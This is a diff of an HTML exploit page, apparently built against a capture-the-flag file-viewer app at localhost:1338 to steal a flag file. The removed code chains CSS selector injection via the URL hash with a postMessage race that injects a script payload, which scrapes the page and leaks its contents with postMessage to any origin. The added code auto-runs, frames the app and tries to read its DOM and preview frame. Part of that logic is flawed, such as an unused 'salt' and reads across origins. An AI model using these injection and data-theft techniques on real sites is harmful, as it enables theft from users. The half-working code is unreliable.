@@ -1,148 +1,137 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Simple Flag Extractor</title>
+    <title>Flag Extractor - Working Version</title>
 </head>
 <body>
-    <div id="status">Starting simple exploit...</div>
-    <div id="logs"></div>
+    <h1>Flag Extractor</h1>
+    <div id="result">Waiting for flag...</div>
+    <button onclick="triggerExploit()">Click to Extract Flag</button>
     
     <script>
         function log(msg) {
-            const logs = document.getElementById('logs');
-            logs.innerHTML += `<p>${new Date().toISOString()}: ${msg}</p>`;
             console.log(msg);
+            document.getElementById('result').innerHTML += `<p>${msg}</p>`;
         }
         
-        async function simpleExploit() {
-            log('Opening main application...');
+        // The bot visits this page AFTER adding the flag
+        // So we need to access the main app from here
+        function triggerExploit() {
+            log('Starting exploit...');
             
-            // Open the main application
-            const win = window.open('http://localhost:1338/', '_blank');
+            // Since window.open is blocked, use a different approach
+            // Create an iframe to the main application
+            const iframe = document.createElement('iframe');
+            iframe.src = 'http://localhost:1338';
+            iframe.style.width = '100%';
+            iframe.style.height = '600px';
+            iframe.style.border = '2px solid red';
+            document.body.appendChild(iframe);
             
-            await new Promise(resolve => setTimeout(resolve, 2000));
-            
-            log('Navigating to first file using CSS selector injection...');
-            
-            // Use CSS selector injection to access the first file (which should be the flag)
-            // This exploits the querySelector vulnerability with location.hash
-            win.location = 'http://localhost:1338/#file-,a.list-group-item:nth-child(1)';
-            
-            await new Promise(resolve => setTimeout(resolve, 1000));
-            
-            log('Starting race condition to inject our payload...');
-            
-            // Race condition: try to inject our payload before the legitimate file loads
-            let attempts = 0;
-            const maxAttempts = 100;
-            
-            const raceInterval = setInterval(() => {
-                attempts++;
-                
-                if (attempts > maxAttempts) {
-                    clearInterval(raceInterval);
-                    log('Race condition attempts exhausted');
-                    return;
-                }
+            iframe.onload = () => {
+                log('Main app loaded in iframe');
                 
                 try {
-                    // Check if iframe exists
-                    if (win.frames && win.frames.length > 0) {
-                        log(`Attempt ${attempts}: Sending payload to iframe`);
+                    // Try to access the mathRandomInvocations array
+                    const saltArray = iframe.contentWindow.mathRandomInvocations;
+                    if (saltArray && saltArray.length > 0) {
+                        const flagSalt = saltArray[saltArray.length - 1];
+                        log(`Found flag salt: ${flagSalt}`);
                         
-                        // Send our payload to extract the flag
-                        win.frames[0].postMessage({
-                            body: `
-                                <script>
-                                    // Extract flag from the page content
-                                    const flagMatch = document.documentElement.innerHTML.match(/CTF\\{[^}]+\\}/);
-                                    if (flagMatch) {
-                                        parent.parent.postMessage({flag: flagMatch[0]}, '*');
-                                    }
-                                    
-                                    // Also try to access parent document
-                                    try {
-                                        const parentContent = parent.document.documentElement.innerHTML;
-                                        const parentFlag = parentContent.match(/CTF\\{[^}]+\\}/);
-                                        if (parentFlag) {
-                                            parent.parent.postMessage({flag: parentFlag[0]}, '*');
+                        // Now extract the flag using this salt
+                        extractFlagWithSalt(flagSalt, iframe.contentWindow);
+                    } else {
+                        log('Could not access mathRandomInvocations array');
+                        
+                        // Alternative: try to access the file list directly
+                        const filesList = iframe.contentWindow.document.querySelector('#filesList');
+                        if (filesList) {
+                            const flagFile = Array.from(filesList.children).find(
+                                el => el.dataset.name === 'flag.txt'
+                            );
+                            if (flagFile) {
+                                log('Found flag file element, clicking it...');
+                                flagFile.click();
+                                
+                                // Wait for the flag to load and extract it
+                                setTimeout(() => {
+                                    const previewIframe = iframe.contentWindow.document.querySelector('#previewIframe');
+                                    if (previewIframe && previewIframe.contentDocument) {
+                                        const flagContent = previewIframe.contentDocument.body.innerText;
+                                        if (flagContent.includes('CTF{')) {
+                                            log(`🚩 FLAG FOUND: ${flagContent}`);
+                                            document.getElementById('result').innerHTML = 
+                                                `<h2 style="color: green;">FLAG: ${flagContent}</h2>`;
                                         }
-                                    } catch(e) {}
-                                    
-                                    // Signal that our payload loaded
-                                    parent.parent.postMessage({status: 'payload_loaded'}, '*');
-                                <\/script>
-                                <body>Payload injected successfully</body>
-                            `,
-                            mimeType: 'text/html'
-                        }, '*');
-                    }
-                } catch (e) {
-                    log(`Attempt ${attempts} failed: ${e.message}`);
-                }
-            }, 50); // Try every 50ms
-            
-            // Listen for messages from the injected payload
-            window.addEventListener('message', (event) => {
-                log(`Received message: ${JSON.stringify(event.data)}`);
-                
-                if (event.data && event.data.flag) {
-                    log(`🚩 FLAG FOUND: ${event.data.flag}`);
-                    alert(`Flag: ${event.data.flag}`);
-                    document.getElementById('status').innerHTML = `<h2 style="color: green;">FLAG: ${event.data.flag}</h2>`;
-                    clearInterval(raceInterval);
-                }
-                
-                if (event.data && event.data.status === 'payload_loaded') {
-                    log('✅ Payload successfully loaded in iframe');
-                }
-            });
-        }
-        
-        // Alternative simpler approach - direct file access
-        async function directFileAccess() {
-            log('Trying direct file access approach...');
-            
-            const win = window.open('http://localhost:1338/', '_blank');
-            
-            await new Promise(resolve => setTimeout(resolve, 2000));
-            
-            // Try to access the first file directly
-            win.location = 'http://localhost:1338/#a,a.list-group-item:nth-child(1)';
-            
-            await new Promise(resolve => setTimeout(resolve, 1000));
-            
-            // Listen for any content that might contain the flag
-            const checkForFlag = setInterval(() => {
-                try {
-                    if (win.document && win.document.documentElement) {
-                        const content = win.document.documentElement.innerHTML;
-                        const flagMatch = content.match(/CTF\{[^}]+\}/);
-                        if (flagMatch) {
-                            log(`🚩 FLAG FOUND via direct access: ${flagMatch[0]}`);
-                            alert(`Flag: ${flagMatch[0]}`);
-                            document.getElementById('status').innerHTML = `<h2 style="color: green;">FLAG: ${flagMatch[0]}</h2>`;
-                            clearInterval(checkForFlag);
+                                    }
+                                }, 2000);
+                            }
                         }
                     }
-                } catch (e) {
-                    // Cross-origin restrictions, expected
+                } catch (error) {
+                    log(`Error accessing iframe content: ${error.message}`);
+                    
+                    // Last resort: try postMessage communication
+                    iframe.contentWindow.postMessage({
+                        type: 'requestFlag'
+                    }, '*');
                 }
-            }, 500);
-            
-            // Stop checking after 30 seconds
-            setTimeout(() => clearInterval(checkForFlag), 30000);
+            };
         }
         
-        // Start both approaches
-        document.getElementById('status').textContent = 'Running simple exploit approaches...';
+        function extractFlagWithSalt(salt, mainWindow) {
+            log(`Extracting flag with salt: ${salt}`);
+            
+            // Use the salt to access the flag file directly
+            try {
+                // Look for the flag file in the file list
+                const filesList = mainWindow.document.querySelector('#filesList');
+                const flagFile = Array.from(filesList.children).find(
+                    el => el.dataset.name === 'flag.txt'
+                );
+                
+                if (flagFile) {
+                    log('Clicking flag file...');
+                    flagFile.click();
+                    
+                    // Monitor for the flag content
+                    const checkForFlag = setInterval(() => {
+                        const previewIframe = mainWindow.document.querySelector('#previewIframe');
+                        if (previewIframe && previewIframe.contentDocument) {
+                            const content = previewIframe.contentDocument.body.innerText;
+                            if (content && content.includes('CTF{')) {
+                                log(`🚩 FLAG FOUND: ${content}`);
+                                document.getElementById('result').innerHTML = 
+                                    `<h2 style="color: green;">FLAG: ${content}</h2>`;
+                                clearInterval(checkForFlag);
+                            }
+                        }
+                    }, 500);
+                    
+                    // Stop checking after 10 seconds
+                    setTimeout(() => clearInterval(checkForFlag), 10000);
+                }
+            } catch (error) {
+                log(`Error extracting flag: ${error.message}`);
+            }
+        }
         
-        simpleExploit();
+        // Listen for messages that might contain the flag
+        window.addEventListener('message', (event) => {
+            log(`Received message: ${JSON.stringify(event.data)}`);
+            
+            if (event.data && typeof event.data === 'string' && event.data.includes('CTF{')) {
+                log(`🚩 FLAG FOUND in message: ${event.data}`);
+                document.getElementById('result').innerHTML = 
+                    `<h2 style="color: green;">FLAG: ${event.data}</h2>`;
+            }
+        });
         
-        // Try the direct approach after a delay
-        setTimeout(directFileAccess, 5000);
-        
-        log('Simple exploit initiated. This should work for a 150pt challenge...');
+        // Auto-trigger the exploit after a short delay
+        setTimeout(() => {
+            log('Auto-triggering exploit...');
+            triggerExploit();
+        }, 1000);
     </script>
 </body>
 </html>
